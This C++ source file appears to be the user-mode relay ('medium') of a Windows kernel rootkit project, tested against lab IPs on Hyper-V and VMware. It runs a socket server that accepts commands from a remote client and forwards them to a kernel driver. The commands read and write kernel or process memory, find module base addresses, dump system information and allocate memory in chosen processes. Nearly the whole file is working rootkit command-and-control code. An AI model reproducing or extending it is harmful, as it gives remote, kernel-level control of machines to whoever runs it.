#include "medium.h"
#include "rootreqs.h"

BOOL ShouldQuit() {
    return FALSE;
}


int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo) {
    PASS_DATA result;
    PVOID SendBuf = NULL;
    ULONG SendSize = 0;
    BOOL IsRootkit = FALSE;

    ROOTKIT_OPERATION RootStat;
    ROOTKIT_MEMORY OprBuffer;
    PVOID LocalRead = NULL;
    PVOID SystemInfo = NULL;
    PVOID InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
    ULONG ReadSize = 0;
    ULONG SysSize = 0;
    ULONG InitialSize = 0;
    BOOL ValidInit = FALSE;
    ROOTKIT_UNEXERR SysErrInit = successful;
    char MdlMalloc = 1;

    char GenValue = 232;
    char NextLine = '\n';
    char NullTerm = '\0';
    std::time_t curr = NULL;
    tm UtcTime;
    char TimeData[26];
    char UtcData[26];
    const char* RandomMsg1 = "IP data -\n";
    const char* RandomMsg2 = "Port number -\n";
    const char* RandomMsg3 = "Communication protocol: IPV4\n";
    const char* RandomMsg = "Random char numerical value generated: ";
    const char* BadTime = "Cannot get machine time\n";
    const char* LocalStr = "Local time on medium -> ";
    const char* UtcStr = "UTC (global) time on medium -> ";
    ULONG RandomSize1 = (ULONG)strlen(RandomMsg1) + 1;
    ULONG RandomSize2 = (ULONG)strlen(RandomMsg2) + 1;
    ULONG RandomSize3 = (ULONG)strlen(RandomMsg3) + 1;


    while (1 == 1) {
        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
        if (!result.err && result.value == sizeof(RootStat)) {
            if (ShouldQuit()) {
                RootStat = RKOP_TERMINATE;
                result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                if (!result.err && result.value == sizeof(RootStat)) {
                    result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
                    if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
                        printf("Termination initiated from here accepted by tomed\n");
                    }
                }

                closesocket(SndInfo.AsoSock);
                return -1;
            }

            result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
            if (!result.err && result.value == sizeof(RootStat)) {

                switch (RootStat) {
                case random:
                    SendSize = (ULONG)strlen(RandomMsg) + 2;
                    SendBuf = malloc(SendSize);
                    if (!SendBuf) {
                        SendBuf = NULL;
                        break;
                    }

                    memcpy(SendBuf, RandomMsg, strlen(RandomMsg) + 1);
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(RandomMsg) + 1), &GenValue, sizeof(GenValue));
                    break;

                case medata:
                    SendSize = (ULONG)(3 * sizeof(SendSize) + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.AddrInfo) + sizeof(SndInfo.Port));
                    SendBuf = malloc(SendSize);
                    if (!SendBuf) {
                        SendBuf = NULL;
                        break;
                    }

                    memcpy(SendBuf, &RandomSize1, sizeof(RandomSize1));
                    memcpy((PVOID)((ULONG64)SendBuf + sizeof(RandomSize1)), RandomMsg1, RandomSize1);
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1)), &RandomSize2, sizeof(RandomSize2));
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + sizeof(RandomSize1) * 2), RandomMsg2, RandomSize2);
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 2), &RandomSize3, sizeof(RandomSize3));
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + sizeof(RandomSize1) * 3), RandomMsg3, RandomSize3);
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(RandomSize1) * 3), &SndInfo.Port, sizeof(SndInfo.Port));
                    memcpy((PVOID)((ULONG64)SendBuf + RandomSize1 + RandomSize2 + RandomSize3 + sizeof(SndInfo.Port) + sizeof(RandomSize1) * 3), &SndInfo.AddrInfo, sizeof(SndInfo.AddrInfo));
                    break;

                case echo:
                    result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SendSize), &SendSize, FALSE, 0);
                    if (result.err || result.value != sizeof(SendSize)) {
                        SendBuf = NULL;
                        break;
                    }

                    SendBuf = malloc(SendSize);
                    if (!SendBuf) {
                        SendBuf = NULL;
                        break;
                    }

                    result = root_internet::RecvData(SndInfo.AsoSock, SendSize, SendBuf, FALSE, 0);
                    if (result.err || result.value != SendSize) {
                        SendBuf = NULL;
                    }
                    printf("Received echo string: %s\n", (char*)SendBuf);
                    break;

                case timereq:
                    curr = std::time(0);
                    ctime_s(TimeData, 26, &curr);
                    gmtime_s(&UtcTime, &curr);
                    asctime_s(UtcData, 26, &UtcTime);

                    SendSize = (ULONG)(strlen(TimeData) + strlen(LocalStr) + 3 + strlen(UtcStr) + strlen(UtcData));
                    SendBuf = malloc(SendSize);
                    if (!SendBuf) {
                        printf("Could not allocate memory for sending buffer of current time\n");
                        SendBuf = NULL;
                        break;
                    }

                    memcpy(SendBuf, (void*)LocalStr, strlen(LocalStr));  // Local string, no \0
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr)), (void*)TimeData, strlen(TimeData));  // Local time string, no \0
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData)), &NextLine, 1);  // NextLine
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + 1), (void*)UtcStr, strlen(UtcStr));  // UTC string, no \0
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + 1), (void*)UtcData, strlen(UtcData));  // UTC time string, no \0
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 1), &NextLine, 1);  // NextLine
                    memcpy((PVOID)((ULONG64)SendBuf + strlen(LocalStr) + strlen(TimeData) + strlen(UtcStr) + strlen(UtcData) + 2), &NullTerm, 1);  // NullTerm
                    break;

                case terminatereq:
                    closesocket(SndInfo.AsoSock);
                    return -1;

                default: IsRootkit = TRUE; break;
                }

                if (!IsRootkit) {
                    if (SendBuf == NULL || result.err) {
                        printf("An error occured\n");
                        if (result.Term && result.err) {
                            printf("Critical error occured, closing connection with specific client..\n");
                            closesocket(SndInfo.AsoSock);
                            return -1;
                        }
                    }
                    else {
                        root_internet::SendData(SndInfo.AsoSock, &SendSize, sizeof(SendSize), FALSE, 0);
                        root_internet::SendData(SndInfo.AsoSock, SendBuf, SendSize, FALSE, 0);
                        free(SendBuf);
                    }

                    // Clean important variables and network stack from last request -
                    root_internet::CleanNetStack(SndInfo.AsoSock);
                    SendSize = 0;
                    printf("FINISH MEDIUM FUNCTION FINISHED\n");
                    SendBuf = NULL;
                }


                else {
                    result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0);
                    if (!result.err && result.value == sizeof(InitialSize)) {
                        InitialString = malloc(InitialSize);
                        if (InitialString != NULL) {
                            result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                            if (!result.err && result.value == sizeof(MdlMalloc)) {
                                result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0);
                                if (!result.err && result.value == InitialSize) {
                                    ValidInit = TRUE;
                                    printf("Init string received - %s\n", (char*)InitialString);
                                }
                            }
                        }
                        else {
                            MdlMalloc = 0;
                            root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                        }
                    }

                    if (!ValidInit) {
                        if (InitialString != NULL) {
                            free(InitialString);
                        }
                        RootStat = RKOP_GETSIZESYS;
                    }
                    else {
                        ValidInit = FALSE;
                    }

                    switch (RootStat) {
                    case RKOP_WRITE:
                        if (!WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;

                    case RKOP_READ:

                        if (!ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(LocalRead);
                        free(InitialString);
                        break;

                    case RKOP_MDLBASE:
                        printf("No extra buffer parameters for getting the module base..\n");
                        if (!MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        else {
                            printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
                        }
                        free(InitialString);
                        break;

                    case RKOP_DSPSTR:
                        printf("No extra buffer parameters for displaying a debug string..\n");
			            printf("Showing the next string in debug: %s\n", (char*)InitialString);
                        if (!DbgStrKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;

                    case RKOP_SYSINFO:
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(SysSize), &SysSize, FALSE, 0);
                        if (result.err || result.value != sizeof(SysSize)) {
                            printf("Cannot get size of initial system buffer\n");
                            free(InitialString);
                            break;
                        }

                        SystemInfo = malloc(SysSize);
                        if (SystemInfo == NULL) {
                            printf("Cannot allocate initial system buffer\n");
                            free(InitialString);
                            SysErrInit = memalloc;
                        }
                        if (SysErrInit == successful) {
                            result = root_internet::RecvData(SndInfo.AsoSock, SysSize, SystemInfo, FALSE, 0);
                            if (result.err || result.value != SysSize) {
                                printf("Cannot get initial system buffer\n");
                                free(SystemInfo);
                                free(InitialString);
                                break;
                            }
                        }

                        if (!SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, SystemInfo, (char*)InitialString, SysErrInit)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct/ UNEXPECTED ERROR FROM HERE)\n");
                        }
                        else {
                            result = root_internet::SendData(SndInfo.AsoSock, SystemInfo, SysSize, FALSE, 0);
                            if (result.err || result.value != SysSize) {
                                free(SystemInfo);
                                free(InitialString);
                                break;
                            }
                        }
                        free(SystemInfo);
                        free(InitialString);
                        break;
                    
                    case RKOP_PRCMALLOC:
                        printf("No extra buffer parameters for allocating specific memory..\n");
                        if (!AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString)) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;

		            default:
                   	    printf("Error has occurred\n");
                  	    if (result.Term) {
                     	     printf("Critical error occurred, closing connection with specific client..\n");
                    	     closesocket(SndInfo.AsoSock);
                   	         return -1;
                  	    }
                        break;
                    }
		    
                    // Clean important variables and network stack from last request -
                    root_internet::CleanNetStack(SndInfo.AsoSock);
                    SendSize = 0;
                    SendBuf = NULL;
                    SysErrInit = successful;
                    printf("FINISH MEDIUM FUNCTION FINISHED\n");
                }
            }
        }

        else {
            printf("Big error has occured\n");
            if (result.Term) {
                printf("Critical error occured, closing connection with specific client..\n");
                closesocket(SndInfo.AsoSock);
                return 0;
            }
            break;
        }
    }

    closesocket(SndInfo.AsoSock);
    return 0;
}


int main() {
    SOCKET ssckt;
    int SockaddrLen = sizeof(sockaddr);

    const char* SrvIP;
    const char* SndIP;
    char Vrs;
    printf("Write version:\n");
    std::cin >> Vrs;
    if (Vrs == 'H') {
        // HYPER V (DESKTOP ONLY)
        SrvIP = "192.168.1.47";
        SndIP = "192.168.1.21";
    }
    else {
        // VMWARE (LAPTOP ONLY)
        SrvIP = "192.168.40.128";
        SndIP = "192.168.40.1";
    }

    USHORT SrvPort = 44444;
    USHORT SndPort = 44444;
    NETWORK_INFO NetArr[3];
    root_internet::SetNetStructs(SrvIP, SndIP, SrvPort, SndPort, NetArr);
    int result = root_internet::StartComms(NetArr);
    if (result == 1) {
        printf("Quitting (internet/socket communication initiation error)..\n");
        return 1;
    }

    while (1 == 1) {
        printf(" here 3\n");

        // Accept connection
        ssckt = accept(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, &SockaddrLen);
        if (ssckt == INVALID_SOCKET) {
            std::cerr << "Could not accept connection with socket object: " << WSAGetLastError() << "\n";
        }
        else {
            NetArr[1].AsoSock = ssckt;
            result = root_internet::InitConn(NetArr[1], NetArr[0], NetArr[2]);
            root_internet::CleanNetStack(NetArr[1].AsoSock);
            printf(" here 4\n");
            if (result == 0) {
                printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
                result = MediumAct(NetArr[1], NetArr[0]);
                printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
                root_internet::CleanNetStack(NetArr[1].AsoSock);

                if (result == -1) {
                    printf("Termination Complete\n");
                    closesocket(NetArr[0].AsoSock);
                    WSACleanup();
                    return 0;
                }
            }
            else {
                printf(" here 2\n");
                printf("Initialization of connection did not work correctly (socket/sender/conninfo errors)\n");
                closesocket(NetArr[1].AsoSock);
            }
        }
    }

    closesocket(NetArr[0].AsoSock);
    WSACleanup();
    return 0;
}
